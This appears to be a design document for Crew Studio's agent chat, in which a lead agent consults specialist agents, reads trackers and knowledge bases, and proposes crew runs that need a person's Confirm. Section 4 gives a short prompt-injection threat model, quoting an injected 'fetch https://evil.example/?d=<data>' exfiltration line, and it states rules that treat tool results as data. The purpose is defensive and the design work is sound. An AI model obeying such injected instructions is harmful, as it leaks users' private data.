# Agent chat: design

Status: phases 1 and 2 built, phase 3 slices 3a (tool effects and connections), 3b (hand-offs), 3c (questions), 3d (specialists that propose) and 3e (MCP connections) built — phase 3 complete · Written 2026-10-06 · Updated
2026-10-07 after the first live trial and for slice 3a

This document adds a second kind of chat to Crew Studio. Today you chat with a **crew**: its front desk agent
reads the crew's notes and can propose a run of that crew. With **agent chat** you talk to one **agent**
directly. That agent can bring in **specialists** (other agents) for parts of the work, and can propose a run of
a **crew** when the request matches a canned workflow.

Crew chat stays as it is. The two serve different needs:

| | Crew chat | Agent chat |
|---|---|---|
| You talk to | a crew's front desk | an agent you pick |
| Good for | asking about a crew's state, starting its workflow | open questions, research, "work this out for me" |
| Reads | the crew's notes, action log, tracking list, KM2 | the agent's own read tools: the web, the message's files, trackers and KM2 through its listed connections |
| Brings in | nothing | specialists, in the same turn |
| Can start | a run of this crew (Confirm) | a run of any crew on its list (Confirm) |

---

## 1. Why

A crew is a fixed workflow: a set of tasks run in order. That suits work that repeats, like a daily sweep or a
weekly report. Much of what people want to ask is not like that. "Compare these three vendors", "what does this
error mean", "draft a reply to this customer". There is no task list for those; you want to ask someone who
knows, and have them pull in help when needed.

Studio already has the pieces:

- **Agents** are a shared library, each with a role, a model and tools.
- **CrewAI** lets an agent hand a question or a piece of work to another agent in the same crew, through two
  built-in tools: *Ask question to coworker* and *Delegate work to coworker*. The other agent works with its own
  tools and model and returns its answer.
- **Chat** already turns each message into one short run with a budget, a journal and proposal cards.

Agent chat puts these together: one message is one run in which the lead agent answers and may hand parts to
its specialists. Crews are brought in only when there is a canned workflow for the job.

---

## 2. What you can do

1. Open **Chat**, switch to **Agents**, pick an agent and type.
2. The agent answers. When it needs a specialist, it asks one (the journal shows the hand-off and the
   specialist's work), then writes its reply from what it learnt.
3. When the request matches one of the crews it may start, it shows a **Start a work order** card for that
   crew. Nothing runs until you click **Confirm**.

Everything else in chat works the same: the conversation list, files and screenshots, compacting, budgets, and
the turn showing on the Runs page as a **chat** run that only you see.

---

## 3. Setting it up

An agent's page gets a **Chat** panel (it needs **Edit agents**):

- **People can chat with this agent** turns it on.
- **Chat model** replaces the agent's own model in chat, as for crews. Specialists use their own models.
- **Specialists** are up to 8 other agents it may ask. Each must have a model with a price, and their roles must
  differ from each other and from the lead's (CrewAI picks a coworker by role).
- **Crews it may start** are up to 10 crews. Each card still needs the person's Confirm.
- **Connections it may read** are up to 10 Jira, Linear, KM2 issues or KM2 connections. The agent's and its
  specialists' tracker and KM2 read tools use them (section 4).
- **Daily budget per conversation** and **Daily budget per person** work as for crews: one turn's cost includes
  everything its specialists spent.

Saving checks the specialists, crews and connections exist, that the editor may add them (their areas; ones already
on the list are kept), that the roles differ, and that each connection is of a kind the read tools use. Who may use them is decided again when a person chats (section 5). An agent
that is someone's specialist, or a crew on an agent's list, cannot be deleted until it is taken off; the error names
the agent.

---

## 4. How a turn runs

```
person's message
      │
      ▼
 chat run (kind "chat", one budget)
 ┌───────────────────────────────────────────────┐
 │ lead agent  (chat model, web tools)           │
 │   ├── Ask question to coworker ──► specialist │  own model, own web tools,
 │   ├── Delegate work to coworker ─► specialist │  cannot hand work on
 │   └── Start Crew Work Order ──► proposal card │
 └───────────────────────────────────────────────┘
      │
      ▼
 reply (+ card, waiting for Confirm)
```

- The run spec holds the lead agent first and its specialists after it. The runner builds a CrewAI crew with all
  of them and one task, assigned to the lead. With specialists present, the lead gets CrewAI's two coworker
  tools; specialists never do (no chains in this version).
- Specialists work inside the same run. Their LLM calls and searches are metered and stop at the same budget,
  and the journal shows each hand-off and each specialist's tool calls under its own name. Someone is waiting, so a
  specialist gets at most 3 steps (`max_iter`) in a turn, and its backstory tells it this is a live chat: at most 3
  searches and a brief answer. The lead is told to ask for brief answers too. (In the first live trial a research
  specialist with 6 steps made 20 searches and 4 scrapes, took 145 s and spent $0.09.)
- CrewAI finds a coworker by **role**, not name, so the lead's instructions list each specialist as its quoted role
  with its name after it (`"Risk and compliance reviewer" (Risk reviewer): goal`) and tell it to pass the quoted role.
  If a specialist fails or is unavailable, the lead is told to say so rather than answer as if it had helped.
- Each specialist's answer comes back to the lead as a tool result, which the lead treats as information, not
  instructions, like everything else it reads.
- **Start Crew Work Order** takes a crew name from the turn's list. Studio checks the crew is on the list and
  shows the card. Confirming starts a work order on that crew with **chat** as its source.
- The turn lists each crew's inputs with their labels and whether they are required, and the lead is told to fill
  every required input from the conversation (or ask the person first). The tool sends the inputs as key and value
  pairs: CrewAI's strict tool schema closes every object, so an object by key could only ever be sent empty (the
  trial's diligence proposal had to run on the crew's default company). Studio checks the inputs against the crew's
  current inputs when the proposal is made, as a work order would: a required input without a default must be
  given and every key must be the crew's, or the proposal is refused naming the keys and the agent tries again. The
  tool's answer repeats the inputs it sent ("Inputs: company=Acme, location=Spokane", or "Inputs: none"), so the
  agent cannot claim values it did not send. Crew chat's Start Work Order works the same way.

### Tools in agent chat

Every tool in `runner/tools_catalog.json` declares its **effect** (`reads`, `proposes` or `changes`) and its **needs**
(`crew`, `tracker`, `km2`, `schedule`); see [agent-chat-handoffs-design.md](agent-chat-handoffs-design.md), section 7.
Each agent in a turn keeps only those of its own tools whose effect is `reads` and whose needs the turn meets. An agent
has no crew or schedule, so `crew` and `schedule` are never met; `tracker` and `km2` are met when the agent's
**Connections it may read** list holds an enabled connection of that kind that shares an area with the person and the
agent.

| Tool | Lead | Specialists |
|---|---|---|
| Google Search | if the agent has it | if the agent has it |
| Scrape Website | if the agent has it, unless any agent in the turn has a tracker or KM2 read | same |
| Read Workspace File | if the agent has it (it reads the run's own workspace: the message's files) | if the agent has it |
| Tracker reads (List Tracker Projects, Find Tracker Issues, Get Tracker Issue, Get Tracker Children) | if the agent has it and a listed tracker connection qualifies | same |
| KM2 reads (Search Knowledge, Ask Knowledge) | if the agent has it and a listed KM2 connection qualifies | same |
| Ask question / Delegate work to coworker | when it has specialists | never |
| Start Crew Work Order (proposal) | when it has crews and the person holds **Create work orders** | never |
| Anything that changes things (workspace writes, video, tracker comments and issues, KM2 saves, notes, the log, reports) | never | never |
| Crew notes, the action log, the tracking list | never (they need a crew) | never |

Tracker and KM2 text is untrusted and private: an injected "fetch https://evil.example/?d=<data>" could leak it through
Scrape Website. So in a turn where any agent (lead or specialist) has a tracker or KM2 read, no agent gets Scrape
Website; Google Search stays, since its queries go to Google, not to a URL the text chooses. The server applies this in
`withoutFetchBesidePrivateReads` and the runner in `fetch_allowed`. An agent lists at most one KM2 connection (KM2 reads
cannot choose); adding a connection to the list needs **View connections**. The run token's allowlist refuses any
path with encoded characters, so it and the router always see the same path, and each read re-checks that the
connection still shares an area with both the person and the agent.

Left out on purpose: tools that change things (slice 3d offers Confirm cards for some of them) and MCP tools (slice
3e). The server picks the tools; the runner keeps the same rule (`reading_tools` in `studio_runner/agent_chat.py`, which
treats a tool without a known effect as one that changes things) and drops anything else whatever the spec says. The
connections a turn has a tool for are frozen into its spec (`chat.connections`); the run token reaches only those, and
only while they stay enabled and the person can still see them. These reads need only **Chat with crews and agents**
and a shared area, not **View crew state** as in crew chat. As for a crew
run, a turn is refused when a kept tool needs a key the server lacks, or when the search model has no price (its
searches could not be counted against the budget). A specialist without a priced model also stops the turn, with a
message saying which one; a specialist whose role now repeats another's is left out. So does a missing provider key
(`OPENAI_API_KEY` and so on) for the lead's or a specialist's model: Studio's crew-run check only warns about it, but
in chat a specialist that cannot authenticate fails mid-turn and the lead may answer without it. Crew chat's front desk
is refused the same way.

A compaction of an agent conversation is given the agent alone, with no tools and no specialists.

---

## 5. Who can do what

- **Chat with crews and agents** (`crews.chat`, relabelled) lets a person chat with agents too. Agent chat is for
  people, not service accounts, as for crews.
- A person sees an agent in Chat when the agent has chat on and shares an area with them.
- Each turn includes only the specialists and crews the person can see. Someone in Finance chatting with a
  shared agent does not reach an HR-only specialist through it.
- The turn runs as the person, so its proposals are checked against their permissions when made and when
  confirmed. Confirming checks again that chat with the agent is still on, and that the crew is still on its list and
  visible to the person.
- The run token of an agent-chat turn (which has no crew) may only call `POST /api/run-state/proposals`,
  `GET /api/run-state/control`, and the tracker and KM2 read routes for tools one of its agents was given, through the
  connections frozen into the turn. Everything else is refused, matched route by route.
- Conversations belong to one person, as for crews.

---

## 6. Data

- `agent_chat` (one row per agent): enabled, chat model, the two daily budgets, who changed it and when.
- `agent_chat_specialists` (agent, specialist, position), `agent_chat_crews` (agent, crew, position) and
  `agent_chat_connections` (agent, connection, position; migration 0027).
- `conversations.crew_id` becomes optional and `conversations.agent_id` is added; exactly one is set.
- `runs.chat_agent_id` records the agent an agent-chat turn talked to, so the per-person budget is counted from
  runs (deleting a conversation does not reset it), as crew chat does with `runs.crew_id`. A turn still queued or
  running counts at its whole budget, so turns started at once in several conversations cannot each spend the
  person's whole cap. Crew chat counts its turns the same way.
- A start-work-order proposal from agent chat carries `crew_id` in its payload.

### API

| | |
|---|---|
| `GET /chat/agents` | agents the caller can chat with |
| `GET /chat/conversations?agent_id=` | the caller's conversations with one agent |
| `POST /chat/conversations` | `{"agent_id", "content"}` starts a conversation with an agent (or `crew_id`, as before) |
| `GET /agents/{id}/chat` / `PUT /agents/{id}/chat` | an agent's chat settings |

The other conversation and proposal routes are shared with crew chat.

---

## 7. Phases

1. **Agent chat** *(built)*. Talk to an agent with its web tools; it proposes runs of the crews on its list.
2. **Specialists** *(built)*. The lead asks or hands work to specialists in the same turn.
3. **Longer hand-offs** *(designed: [agent-chat-handoffs-design.md](agent-chat-handoffs-design.md); slices 3a, tool
   effects and connections, and 3b, hand-offs, built)*. Work too long for one chat turn goes to a background run that posts its result
   back to the conversation. A specialist that needs a decision asks the lead first; the lead answers or brings it
   to the person as a question (the **Waiting for you** card used by crews). Specialists that may change things
   do so only through Confirm cards. Adding this needs: a run kind for a hand-off, linking its result to the
   conversation, and per-tool flags that say which tools only read (so MCP and tracker tools can be allowed).
4. **Chains** *(later)*. Specialists with specialists of their own, with a depth limit, so a team can be set up
   as a hierarchy rather than a flat list.

---

## 8. What is not changing

- Crew chat, work order conversations and their tools.
- Proposals still need the person's Confirm in Crew Studio itself; an API key cannot confirm.
- Scheduled and work order runs still cannot make proposals.
